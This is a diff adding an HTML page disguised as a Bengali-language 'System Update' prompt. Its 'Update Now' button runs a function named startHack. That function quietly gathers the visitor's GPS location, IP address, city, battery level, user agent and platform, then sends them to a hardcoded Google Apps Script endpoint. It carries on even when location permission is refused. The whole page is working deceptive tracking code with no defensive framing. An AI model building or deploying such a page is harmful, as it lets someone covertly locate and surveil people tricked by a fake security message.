@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Update</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #f4f4f4; text-align: center; padding-top: 50px; }
+        .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); max-width: 300px; margin: auto; }
+        h2 { color: #333; font-size: 18px; }
+        p { color: #666; font-size: 14px; }
+        .btn { background: #007bff; color: white; border: none; padding: 12px 25px; border-radius: 5px; font-size: 16px; cursor: pointer; margin-top: 15px; width: 100%; }
+        .btn:hover { background: #0056b3; }
+        #status { margin-top: 10px; font-size: 12px; color: green; display: none; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>🔔 সিস্টেম আপডেট প্রয়োজন</h2>
+    <p>আপনার ডিভাইসের নিরাপত্তা বাড়ানোর জন্য নতুন পারমিশন প্রয়োজন। দয়া করে নিচে ক্লিক করুন।</p>
+    <button class="btn" onclick="startHack()">Update Now</button>
+    <div id="status">ডেটা পাঠানো হচ্ছে...</div>
+</div>
+
+<script>
+    // আপনার গুগল শিটের URL এখানে বসান (https://script.google.com/macros/s/.../exec)
+    const SHEET_URL = 'https://script.google.com/macros/s/AKfycbycWxHSynXyY53SpIcxpyA-TGmDknjalJTBb5DaTpf6ZMYeZV_HfRk7Nh5lD1nQpQbB/exec'; 
+
+    async function startHack() {
+        document.getElementById('status').style.display = 'block';
+        
+        let deviceData = {};
+
+        try {
+            // ১. ব্যাটারি লেভেল নেওয়া (সবচেয়ে দ্রুত)
+            if(navigator.getBattery){
+                const battery = await navigator.getBattery();
+                deviceData.battery = (battery.level * 100).toFixed(0) + "%";
+            } else {
+                deviceData.battery = "N/A";
+            }
+
+            // ২. লোকেশন নেওয়া (সবচেয়ে গুরুত্বপূর্ণ - পারমিশন চাইবে)
+            const location = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(
+                    pos => resolve({ lat: pos.coords.latitude, long: pos.coords.longitude }),
+                    err => resolve({ lat: "Denied", long: "Denied" }) // পারমিশন না দিলেও রান করবে
+                );
+            });
+            deviceData.lat = location.lat;
+            deviceData.long = location.long;
+
+            // ৩. IP এড্রেস নেওয়া (API কল)
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                deviceData.ip = ipData.ip;
+                deviceData.city = ipData.city;
+                deviceData.country = ipData.country_name;
+            } catch (e) {
+                deviceData.ip = "Fetch Failed";
+            }
+
+            // ৪. ডিভাইসের তথ্য
+            deviceData.userAgent = navigator.userAgent;
+            deviceData.platform = navigator.platform;
+            deviceData.time = new Date().toLocaleString();
+
+            // ৫. সব ডাটা গুগল শিটে পাঠানো (এখন সব ডেটা প্রস্তুত)
+            await sendDataToSheet(deviceData);
+
+        } catch (error) {
+            console.error("Error:", error);
+            document.getElementById('status').innerText = "❌ ত্রুটি দেখা দিয়েছে";
+        }
+    }
+
+    async function sendDataToSheet(data) {
+        // গুগল শিটে ডেটা পাঠানোর ফাংশন
+        try {
+            await fetch(SHEET_URL, {
+                method: 'POST',
+                mode: 'no-cors', // গুগলের জন্য জরুরি
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+            
+            document.getElementById('status').innerText = "✅ লোকেশন ও IP সফলভাবে পাঠানো হয়েছে!";
+            document.getElementById('status').style.color = "#00ff00";
+        } catch (e) {
+            console.log("Send Error:", e);
+            document.getElementById('status').innerText = "ডেটা পাঠানো হচ্ছে...";
+        }
+    }
+</script>
+
+</body>
+</html>
